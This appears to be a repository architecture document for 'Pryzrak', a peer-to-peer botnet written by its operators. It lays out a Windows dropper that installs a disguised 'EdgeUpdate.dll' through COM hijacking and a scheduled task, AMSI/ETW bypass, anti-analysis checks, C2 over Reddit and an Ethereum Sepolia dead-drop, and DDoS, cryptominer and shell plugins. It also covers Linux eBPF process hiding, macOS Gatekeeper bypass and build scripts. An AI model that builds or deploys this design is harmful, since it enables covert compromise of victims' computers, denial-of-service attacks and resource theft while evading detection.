# Pryzrak Architecture

> Detailed technical documentation of the system architecture.

---

## Table of Contents

- [Overview](#overview)
- [Node Types](#node-types)
- [Edge Agent Architecture](#edge-agent-architecture)
- [Network Topology](#network-topology)
- [Protocol Specification](#protocol-specification)
- [Bootstrap Mechanism](#bootstrap-mechanism)
- [Stealth Subsystem](#stealth-subsystem)
- [Build Pipeline](#build-pipeline)

---

## Overview

Pryzrak implements a **two-tier distributed architecture** with a hidden operator node:

```
┌────────────────────────────────────────────────────────────────────────┐
│                            CONTROL PLANE                               │
│                       Cloud P2P Mesh (UDP 31337)                       │
│                                                                        │
│   ┌───────────┐       ┌───────────┐       ┌───────────────────┐        │
│   │   Cloud   │◄─────►│   Cloud   │◄─────►│      PRYZRAK      │        │
│   │   Node    │  P2P  │   Node    │  P2P  │   (Hidden Master) │        │
│   │   (Zig)   │       │   (Zig)   │       │       (Rust)      │        │
│   └─────┬─────┘       └─────┬─────┘       └─────────┬─────────┘        │
│         │                   │                       │                  │
│   ┌─────┴─────┐       ┌─────┴─────┐       ┌─────────┴─────────┐        │
│   │  Verify   │       │  Verify   │       │    PRIVATE KEY    │        │
│   │  + Relay  │       │  + Relay  │       │    Sign + Send    │        │
│   └─────┬─────┘       └─────┬─────┘       └─────────┬─────────┘        │
│         │                   │                       │ SSH (Operator)   │
│         │    (Identical P2P packets)                ▼                  │
│         │                   │             ┌───────────────┐            │
│         │                   │             │    Operator   │            │
│         │                   │             │    Terminal   │            │
│         │                   │             └───────────────┘            │
└─────────┼───────────────────┼──────────────────────────────────────────┘
          │                   │
          └─────────┬─────────┘
                    │ MQTT (Leader → Cloud)
                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│                           EXECUTION PLANE                              │
│                     Edge Nodes (Rust) — Agents                         │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │                      LAN CLUSTER                                 │  │
│  │   ┌──────────┐       ┌──────────┐       ┌──────────┐            │  │
│  │   │  Edge A  │◄─UDP─►│  Edge B  │◄─UDP─►│  Edge C  │            │  │
│  │   │  WORKER  │       │  LEADER  │       │  WORKER  │            │  │
│  │   └──────────┘       └────┬─────┘       └──────────┘            │  │
│  │                           │                                      │  │
│  │                           │ MQTT to Cloud (6 parallel)           │  │
│  │                           ▼                                      │  │
│  └──────────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────────┘
```

### Key Design Principles

| Principle | Description |
|-----------|-------------|
| **Pryzrak Blending** | Pryzrak is indistinguishable from Cloud nodes |
| **Signature Asymmetry** | All nodes verify, only Pryzrak signs |
| **LAN Clustering** | Edge nodes elect leader, reduce Cloud traffic |
| **Multi-tier Bootstrap** | 5 fallback methods for resilience |
| **Ghost Mode** | Agents start silent, wait for activation signal |

---

## Node Types

### Cloud Node (`crates/nodes/cloud`)
- **Language**: Zig
- **Role**: Mesh participant, signature verifier, Edge relay
- Participates in P2P gossip (UDP 31337)
- Maintains neighbor routing table
- **Verifies** Ed25519 signatures on commands
- Relays commands to connected Edge nodes

### Pryzrak Node (`crates/nodes/phantom`)
- **Language**: Rust
- **Role**: Hidden master within Cloud mesh
- Participates in **same P2P mesh** as Cloud nodes
- **Signs** commands with master private key
- Provides SSH shell for operator (port 12961)
- Can broadcast to Sepolia blockchain for fallback

### Edge Node (`crates/nodes/edge`)
- **Language**: Rust
- **Role**: Target agent, local cluster coordination
- **Two-component architecture**: Dropper EXE + Payload DLL
- Leader election within local network (UDP 31338)
- Executes plugins (DDoS, cryptominer, etc.)
- **Zero-Noise Discovery**: Passive sniffing + covert handshake

---

## Edge Agent Architecture

### Component Overview

The Windows Edge agent consists of two components:

| Component | File | Size | Purpose |
|-----------|------|------|---------|
| **Dropper** | `edge_dropper.exe` | ~3.8 MB | Drops DLL, establishes persistence, self-deletes |
| **Payload** | `edge.dll` | ~2.7 MB | Core logic, runs inside Explorer.exe via COM |

### Execution Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         DROPPER (edge.exe)                              │
│                                                                         │
│  start_exe()                                                            │
│  ├── [1] check_and_apply_stealth()                                      │
│  │       ├── Debugger/Sandbox/VM detection                              │
│  │       ├── Ghost Protocol (AMSI/ETW bypass)                           │
│  │       └── Happy strings injection                                    │
│  │                                                                      │
│  ├── [2] execute_dropper()                                              │
│  │       ├── Extract embedded DLL (include_bytes!)                      │
│  │       ├── Create %APPDATA%\Microsoft\OneDrive\                       │
│  │       ├── Write EdgeUpdate.dll                                       │
│  │       ├── Set Hidden + System attributes                             │
│  │       └── apply_persistence_for_dll()                                │
│  │             ├── COM Hijacking (HKCU\...\InprocServer32 → DLL)        │
│  │             └── Scheduled Task (rundll32 → DLL)                      │
│  │                                                                      │
│  ├── [3] self_delete()                                                  │
│  │       └── Delete original EXE using rename trick                     │
│  │                                                                      │
│  └── [4] EXIT (Process terminates)                                      │
│           └── DLL activates on next COM usage                           │
└─────────────────────────────────────────────────────────────────────────┘

                    ↓ Windows loads DLL via COM Hijacking ↓

┌─────────────────────────────────────────────────────────────────────────┐
│                         PAYLOAD (edge.dll)                              │
│                                                                         │
│  DllMain(DLL_PROCESS_ATTACH)                                            │
│  ├── GetModuleHandleExW(..., PIN) → Prevent unload                      │
│  └── Return immediately (Loader Lock active)                            │
│                                                                         │
│  DllGetClassObject() [Called by Windows COM]                            │
│  ├── std::sync::Once → Ensure single initialization                     │
│  ├── check_and_apply_stealth() → Re-apply in thread context             │
│  ├── async_main() [SPAWN THREAD]                                        │
│  │       ├── Ghost Mode Gate (wait for activation)                      │
│  │       ├── P2P Gate (wait for enable_p2p command)                     │
│  │       ├── C2 Listener (Reddit + Sepolia polling)                     │
│  │       ├── ZeroNoise Discovery                                        │
│  │       ├── Leader Election                                            │
│  │       └── Leader/Worker Mode Loop                                    │
│  └── Forward to msctf.dll (stealth - appear as Language Bar)            │
└─────────────────────────────────────────────────────────────────────────┘
```

### Ghost Mode

Edge nodes start in **Ghost Mode** (completely silent):

| State | Network Activity | C2 Polling | P2P |
|-------|-----------------|------------|-----|
| **Ghost** | None | Reddit/Sepolia only | Disabled |
| **Active** | Full | All channels | Disabled |
| **Active+P2P** | Full | All channels | Enabled |

Transition from Ghost → Active requires a signed command via Reddit or Sepolia smart contract.

---

## LAN Cluster & Leader Election

### Overview

Edge nodes within the same LAN form a **self-organizing cluster**:

```
┌─────────────────────────────────────────────────────────────────┐
│                     LAN CLUSTER (192.168.1.0/24)                │
│                                                                 │
│   ┌────────────┐       ┌────────────┐       ┌────────────┐     │
│   │  Edge A    │       │  Edge B    │       │  Edge C    │     │
│   │  Rank: 100 │       │  Rank: 900 │←─────→│  Rank: 500 │     │
│   │  WORKER    │       │  LEADER    │       │  WORKER    │     │
│   └──────┬─────┘       └──────┬─────┘       └──────┬─────┘     │
│          │                    │                    │           │
│          │    ◄──── UDP Broadcast (31338) ────►   │           │
│          │                    │                    │           │
│          │    ◄──── TCP Bridge (31339) ────►      │           │
│          │                    │                    │           │
│          └────────────────────┼────────────────────┘           │
│                               │                                 │
│                               │ MQTT (1883) to Cloud            │
│                               ▼                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Election Protocol (Modified Bully Algorithm)

| Phase | Action | Description |
|-------|--------|-------------|
| **1. Discovery** | Broadcast `WhoIsLeader` | Node sends 3 UDP packets to 255.255.255.255:31338 |
| **2. Challenge** | Wait 3 seconds | Listen for `IAmLeader` responses |
| **3. Compare** | Rank comparison | Only accept Leaders with `(Rank, NodeID) > (MyRank, MyNodeID)` |
| **4. Promote** | Become Leader | If no stronger Leader found, self-promote and broadcast |
| **5. Heartbeat** | Periodic `IAmLeader` | Leader broadcasts every 5 seconds to maintain dominance |

**Rank Calculation**: `Rank = NodeID % 1000` (pseudo-random, deterministic)

**Tie-Breaker**: If Ranks are equal, higher NodeID wins.

### Port Allocation (LAN)

| Port | Protocol | Purpose |
|------|----------|---------|
| 31338 | UDP | Leader Election (Broadcast) |
| 31339 | TCP | Worker-Leader Bridge (LIPC) |
| 9631 | TCP | Covert Handshake (Zero-Noise) |

---

## Network Topology

### Command Flow

```
1. OPERATOR → PRYZRAK
   ssh admin@phantom -p 12961
   PryzrakC2$ .attack 1.2.3.4 80 60

2. PRYZRAK SIGNS & BROADCASTS
   - Creates P2PCommand packet
   - Signs payload with Ed25519 private key
   - Sends to neighbors (standard gossip)

3. CLOUD MESH PROPAGATION
   - Cloud nodes receive packet
   - Verify signature
   - Flood to 3 random neighbors
   - Forward to Edge subscribers

4. EDGE EXECUTION
   - Edge Leaders receive via MQTT
   - Dispatch to plugins
   - Bridge to Workers
```

### Port Allocation

| Port | Protocol | Used By | Purpose |
|------|----------|---------|---------|
| 31337 | UDP | Cloud | P2P gossip mesh |
| 31338 | UDP | Pryzrak | P2P to Cloud |
| 12961 | TCP/SSH | Pryzrak | Operator shell |
| 1883 | TCP | Cloud | Edge proxy (MQTT) |

---

## Protocol Specification

### P2P Wire Format

```
Packet Types:
┌────────────┬───────────────────────────────────────────────────────┐
│ GOSSIP     │ [Magic][Type=1][Count][IP:Port pairs...]              │
│ COMMAND    │ [Magic][Type=2][Nonce][Signature][Length][Payload]    │
│ COUNT_REQ  │ [Magic][Type=3][ReqID][TTL][OriginIP:Port]            │
│ COUNT_RESP │ [Magic][Type=4][ReqID][NodeCount]                     │
└────────────┴───────────────────────────────────────────────────────┘

Magic: Time-based rotating value (weekly)
Signature: 64 bytes Ed25519
Nonce: 4 bytes (replay protection)
```

---

## Bootstrap Mechanism

Edge discovers Cloud addresses via 5 tiers (ordered by stealth priority):

| Tier | Method | Mechanism | Stealth Level |
|------|--------|-----------|---------------|
| 0 | **Local Cache** | `~/.phantom/peers.json` | ✅ Silent (no network) |
| 1 | **DNS-over-HTTPS** | Query Cloudflare/Google DoH for TXT records | ✅ Encrypted |
| 2 | **Reddit Scraping** | Parse specific subreddit for tagged posts | ✅ Blends with normal traffic |
| 3 | **DGA** | Domain Generation Algorithm (date-seeded) | ⚠️ Detectable pattern |
| 4 | **Ethereum Sepolia** | Read from smart contract dead-drop | ✅ Immutable, decentralized |

All bootstrap payloads are signed with the master Ed25519 key.

### C2 Polling (Reddit + Sepolia)

```rust
// Polling loop in listener.rs
loop {
    // 1. Poll Reddit
    if let Ok(cmd) = check_reddit_posts().await {
        if verify_ed25519_signature(&cmd) {
            handle_command(cmd);
        }
    }

    // 2. Poll Sepolia Smart Contract
    if let Some((peers, _)) = check_sepolia_fallback().await {
        // Valid signature → Activate network
        state.set_mode(SystemMode::Active);
    }

    // 3. Sleep with jitter (5-30 min)
    sleep(random_jitter(300..1800)).await;
}
```

---

## Zero-Noise Discovery

Edge nodes use passive discovery to find each other without generating suspicious traffic:

### Phase 1: Passive Sniffing
- Card in promiscuous mode via `libpnet`
- Capture broadcast traffic (MDNS, NetBIOS, DHCP)
- Filter by OUI (Intel, Realtek = real devices; VMware = skip)
- Build "Shadow Map" of candidate IPs

### Phase 2: Active Probe
- Select IPs with 3+ broadcast hits
- Connect to port 9631 (mimics IPP/CUPS printer)
- Send 4-byte rotating magic number
- Await XOR'd response confirming Pryzrak node

### Phase 3: Registration
- Verified peers added to internal routing
- Can now participate in Leader Election

```
[Sniff] → NetBIOS from 192.168.1.50 (OUI: Intel)
[Sniff] → Hits: 5, Candidate promoted
[Probe] → TCP 192.168.1.50:9631 → Magic sent
[Probe] → Response: XOR match! Peer confirmed.
```

---

## Security Model

### Cryptographic Primitives

| Component | Algorithm | Purpose |
|-----------|-----------|---------|
| Command Signing | Ed25519 | Ensure only Pryzrak can issue commands |
| Magic Numbers | SHA256(date + seed) | Rotating identifiers, prevent replay |
| LIPC Framing | ChaCha20-Poly1305 | Worker-Leader encrypted channel |
| String Obfuscation | XOR (0x55) | Hide strings from static analysis |

### Trust Hierarchy

```
┌───────────────────────────────────────────────────────────────┐
│                      PRYZRAK NODE                             │
│                 (Holds Private Key)                           │
│                         │                                     │
│            Signs all commands with Ed25519                    │
│                         │                                     │
│                         ▼                                     │
│   ┌─────────────────────────────────────────────────────┐    │
│   │                 CLOUD NODES                         │    │
│   │          (Hold only Public Key)                     │    │
│   │                                                     │    │
│   │  • Verify signatures before relaying               │    │
│   │  • Cannot forge commands                           │    │
│   │  • Cannot distinguish Pryzrak from peers           │    │
│   └─────────────────────────────────────────────────────┘    │
│                         │                                     │
│                         ▼                                     │
│   ┌─────────────────────────────────────────────────────┐    │
│   │                 EDGE NODES                          │    │
│   │          (Hold only Public Key)                     │    │
│   │                                                     │    │
│   │  • Verify signatures before execution              │    │
│   │  • Trust Leader for command forwarding             │    │
│   │  • Can verify directly if Leader is compromised    │    │
│   └─────────────────────────────────────────────────────┘    │
└───────────────────────────────────────────────────────────────┘
```

### Replay Protection

- **Nonce**: 4-byte incrementing counter per session
- **Timestamp**: Commands older than 5 minutes are rejected
- **Deduplication**: LRU cache of seen command hashes

---

## Stealth Subsystem

### Windows Evasion (Advanced)

The Windows stealth engine uses a **Zero-Dependency, Native API** architecture:

| Technique | Implementation Details |
|-----------|------------------------|
| **Dropper Architecture** | EXE embeds DLL using `include_bytes!`. Drops to `%APPDATA%\Microsoft\OneDrive\EdgeUpdate.dll`. Sets Hidden+System attributes. Self-deletes after installation. |
| **COM Hijacking** | DLL registered as `InprocServer32` for user-mode CLSID. When Explorer loads this CLSID, it unknowingly loads our DLL. |
| **Module Pinning** | In `DllMain`, calls `GetModuleHandleExW` with `GET_MODULE_HANDLE_EX_FLAG_PIN`. Prevents host process from unloading DLL. |
| **Ghost Protocol** | AMSI/ETW bypass via **Indirect Syscalls**. Patches `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`. |
| **Scheduled Task** | Uses `rundll32.exe` to execute `DllGetClassObject` as backup persistence. Task name: `EdgeUpdateService`. |
| **Obfuscated Sleep** | During sleep cycles, `Ekko` timer encrypts heap and stack, protecting from memory scanners. |
| **Dynamic API Resolution** | All Windows APIs resolved at runtime via hash (djb2). Minimal import table. |
| **Anti-Analysis** | Checks for debuggers (IsDebuggerPresent, CheckRemoteDebuggerPresent), sandboxes (known process names), VMs (CPUID, registry). |

### File Locations

| Component | Path |
|-----------|------|
| Dropped DLL | `%APPDATA%\Microsoft\OneDrive\EdgeUpdate.dll` |
| Registry Key | `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` |
| Scheduled Task | `EdgeUpdateService` (triggers on logon) |

### Linux Evasion

| Technique | Implementation |
|-----------|----------------|
| **Fileless Execution** | `memfd_create` + `fexecve` (no disk write) |
| **Process Hiding** | eBPF filter on `getdents64` syscall |
| **Anti-Kill** | eBPF blocks `kill/tkill` for our PID |
| **Persistence** | Systemd generator in `/run/systemd/generator` |
| **Log Suppression** | eBPF filters `syslog` writes |

### macOS Evasion

| Technique | Implementation |
|-----------|----------------|
| **Code Signing** | Ad-hoc signature for Gatekeeper bypass |
| **Persistence** | LaunchAgent plist in `~/Library/LaunchAgents` |
| **Transparency** | Disable TCC prompts via synthetic events |

---

## Build Pipeline

### Two-Phase Build Process

The Windows build requires two phases to correctly embed the DLL payload:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         PHASE 1: Build DLL                              │
│                                                                         │
│  1. Create empty payload.dll placeholder                                │
│  2. cargo build -p edge --lib --release --target x86_64-pc-windows-gnu  │
│  3. Output: target/x86_64-pc-windows-gnu/release/edge.dll (2.7 MB)      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                         PHASE 2: Build EXE                              │
│                                                                         │
│  1. cp edge.dll → crates/nodes/edge/src/assets/payload.dll              │
│  2. cargo build -p edge --bin edge --release --target x86_64-pc-windows │
│  3. DLL is embedded via include_bytes!("payload.dll")                   │
│  4. Output: target/.../edge.exe (3.8 MB) ← Contains embedded DLL        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                         DISTRIBUTION                                    │
│                                                                         │
│  dist/                                                                  │
│  ├── edge.dll           # Standalone payload (for testing)              │
│  ├── edge_dropper.exe   # Dropper (embeds DLL, production use)          │
│  └── edge_debug.exe     # Debug version with console logs               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Build Script

The `build.sh` script automates both phases:

```bash
#!/bin/bash
# Phase 1: Build DLL
echo -n "" > crates/nodes/edge/src/assets/payload.dll
cargo build -p edge --lib --release --target x86_64-pc-windows-gnu

# Phase 2: Embed and build EXE
cp target/x86_64-pc-windows-gnu/release/edge.dll \
   crates/nodes/edge/src/assets/payload.dll
cargo build -p edge --bin edge --release --target x86_64-pc-windows-gnu
```

### Debug Build

Add `--features debug_mode` to enable:
- Console log output
- IPC daemon for log_viewer connection
- Bypasses certain anti-analysis checks (for testing)

```bash
cargo build -p edge --features debug_mode --release --target x86_64-pc-windows-gnu
```

---

## Source Code Structure

### Edge Agent (`crates/nodes/edge/src/`)

```
src/
├── lib.rs                      # Entry points (start_exe, DllMain, DllGetClassObject)
├── main.rs                     # Binary entry point (calls start_exe)
│
├── stealth/                    # Evasion Engine
│   ├── mod.rs                  # Platform dispatcher
│   └── windows/
│       ├── mod.rs              # check_and_apply_stealth(), run_ghost_mode()
│       ├── persistence.rs      # COM hijacking, scheduled task (DLL-only)
│       ├── api_resolver.rs     # Dynamic API resolution (hash-based)
│       ├── blinding.rs         # Ghost Protocol (AMSI/ETW bypass)
│       ├── anti_analysis.rs    # Debugger/sandbox/VM detection
│       ├── self_delete.rs      # Self-destruct mechanism
│       ├── syscalls.rs         # Indirect syscall support
│       ├── obfuscation.rs      # Sleep obfuscation (Ekko)
│       ├── ghosting.rs         # Process ghosting
│       ├── registry.rs         # Registry operations
│       └── ipc.rs              # Debug IPC daemon
│
├── assets/                     # Dropper Logic
│   ├── mod.rs                  # Module exports
│   ├── dropper.rs              # execute_dropper() - main drop logic
│   ├── embedded_payload.rs     # PAYLOAD_DLL (include_bytes!)
│   └── payload.dll             # Embedded DLL (build artifact)
│
├── c2/                         # Command & Control
│   ├── mod.rs                  # Module exports
│   ├── listener.rs             # Reddit/Sepolia polling loop
│   └── state.rs                # Ghost/Active mode, P2P enabled state
│
├── discovery/                  # Peer Discovery
│   ├── mod.rs                  # ZeroNoiseDiscovery
│   ├── election.rs             # Leader election algorithm
│   ├── eth_listener.rs         # Sepolia smart contract polling
│   └── zero_noise.rs           # Passive LAN discovery
│
├── plugins/                    # Attack Modules
│   ├── mod.rs                  # Plugin manager
│   ├── ddos.rs                 # DDoS plugin
│   └── shell/                  # Shell executor plugin
│
├── core/                       # Core Logic
│   ├── mod.rs                  # run_leader_mode, run_worker_mode
│   └── debug.rs                # Logging macros
│
├── network/                    # Network Stack
│   └── mod.rs                  # lipc, bridge, gossip
│
├── crypto/                     # Cryptography
│   └── mod.rs                  # Ed25519 verification
│
└── happy_strings.rs            # Benign string injection (anti-ML)
```

---

## Changelog

### 2026-01-30: Architecture Simplification

**Removed:**
- Steganography system (logo.png, steg_maker tool)
- `install_stealth_package()` function (old dropper)
- `apply_persistence_triad()` (legacy EXE persistence)
- `setup_scheduled_task()` (legacy EXE scheduler)

**Added:**
- Direct DLL embedding via `include_bytes!`
- Two-phase build process
- `execute_dropper()` in `assets/dropper.rs`
- `apply_persistence_for_dll()` (correct COM hijacking)

**Result:**
- Smaller binaries (~45% reduction)
- Simpler build process
- No external tools required
- Cleaner code separation
